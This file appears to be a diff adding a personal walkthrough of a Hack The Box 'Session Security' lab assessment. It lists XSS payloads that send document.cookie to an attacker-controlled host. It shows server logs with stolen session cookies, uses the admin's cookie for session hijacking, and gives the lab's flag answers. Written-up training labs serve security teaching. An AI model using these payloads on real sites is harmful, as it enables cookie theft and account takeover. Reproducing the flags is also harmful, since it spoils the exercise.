@@ -1,0 +1,96 @@
+[About this module]
+
+    - Hi guys! So as you can see, this is a quite special module that almost all of it just "Yes/No" questions (except the skill assessment, of course)
+
+    => They already told you what to do super carefully, just follow them step by step and you will know the answer
+
+    - Because of that, I only guide you guys the skill assessment oke =))
+
+
+[Some useful commands & tips]
+
+    # sudo -E wireshark
+
+    - Search within the Packet bytes for any "keyword" as follows:
+
+    => Edit -> Find Packet >> Left-click on Packet list and then click Packet bytes >> Select String on the third drop-down menu and specify the "keyword"
+
+    - <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<OUR_IP>:<PORT>/gather.php?cookie=' + document.cookie;"></video>
+
+    - <script>fetch(`http://<OUR_IP>:<PORT>?cookie=${btoa(document.cookie)}`)</script>
+
+    - <h1 onmouseover='document.write(`<img src="http://<OUR_IP>:<PORT>?cookie=${btoa(document.cookie)}">`)'>test</h1>
+
+    - http://csrf.htb.net/app/delete/<table%20background='%2f%2f<OUR_IP>:<PORT>%2f
+
+[Session Security - Skills Assessment]
+
+[*] Target: 10.129.6.4
+
+[*] vHosts needed for these questions:minilab.htb.net 
+
+[Note] Attacking end-users through client-side attacks is in scope for this particular bug bounty program.
+
+[*] Test account credentials:
+        
+        Email: heavycat106
+        Password: rocknrol
+
+[*] Through dirbusting, you identified the following endpoint http://minilab.htb.net/submit-solution
+
+[Question 1] Read the flag residing in the admin's public profile. Answer format: [string]
+
+    - After going to http://minilab.htb.net and login with the given credential, I need to find which parameter is vulnerable for XSS
+
+        <script>fetch(`http://10.10.16.6:5555?Email.php`)</script>
+
+        <script>fetch(`http://10.10.16.6:5555?Phone.php`)</script>
+
+        <script>fetch(`http://10.10.16.6:5555?Country.php`)</script>
+
+        [Note] fetch() function is a built-in JavaScript function used to make HTTP requests to a specified URL and handle the response. 
+               It returns a Promise that resolves to the Response object representing the response to the request.
+
+    => I saved this information and click on "Share"
+
+        # python3 -m http.server 5555                                            
+        Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
+        10.10.16.6 - - [12/Jun/2023 07:28:19] "GET /?Country.php HTTP/1.1" 200 -
+
+    => Country parameter is vulnerable!
+
+    => <script>fetch(`http://10.10.16.6:5555?Country.php?cookie=${btoa(document.cookie)}`)</script> are saved to this parameter
+
+    - Right after I clicked on share, it show me this: 
+
+        10.10.16.6 - - [12/Jun/2023 07:32:51] "GET /?Country.php?cookie=YXV0aC1zZXNzaW9uPXMlM0FMTXFDZ213cGpOeGR6VldrQWdIbWRQejBfUDV0dmJoeC5VdjFkQm9UJTJCV0Vlc3YwTzdKMjB1TDRGeU1yVzRNQzR5cDREVk11ZFRSeUE= HTTP/1.1" 200 -
+
+    => Of course this is our cookie, but we can give this malicious link to the endpoint users
+
+    => I follow the http://minilab.htb.net/submit-solution and they said I can use "?url=" to send the link to the admin
+
+    => http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
+
+        # python3 -m http.server 5555
+        Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
+        10.129.6.4 - - [12/Jun/2023 07:37:03] "GET /?Country.php?cookie=YXV0aC1zZXNzaW9uPXMlM0EzNWNnV2lUYzRXc05kWEtzVjF4SEFjMnRKTDZKQUhMYy5rJTJGYkZkekUxM3BOMXMlMkJ0Q1REZWFFJTJGQ2lycG42T29oUjBMcUNpVFRzOFM4 HTTP/1.1" 200 -
+
+        [Note] After base64 decode, we have auth-session=s%3A35cgWiTc4WsNdXKsV1xHAc2tJL6JAHLc.k%2FbFdzE13pN1s%2BtCTDeaE%2FCirpn6OohR0LqCiTTs8S8
+
+    => We have the admin's cookie, use it to access his/her profile 
+
+    - We so we are Super Admin now let's read admin's public profile => [YOU_ARE_A_SESSION_WARRIOR]
+
+    [!] Answer: "[YOU_ARE_A_SESSION_WARRIOR]"
+
+[Question 2] Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string}
+
+    - So you are in the http://minilab.htb.net/profile?email=superadmin@htb.net right, click on the "Flag2" to download this pcap file
+
+    - Open it with Wireshark
+
+    => Edit -> Find Packet >> Left-click on Packet list and then click Packet bytes >> Select String on the third drop-down menu and specify the "FLAG"
+
+    => FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}
+
+    [!] Answer: "FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}"
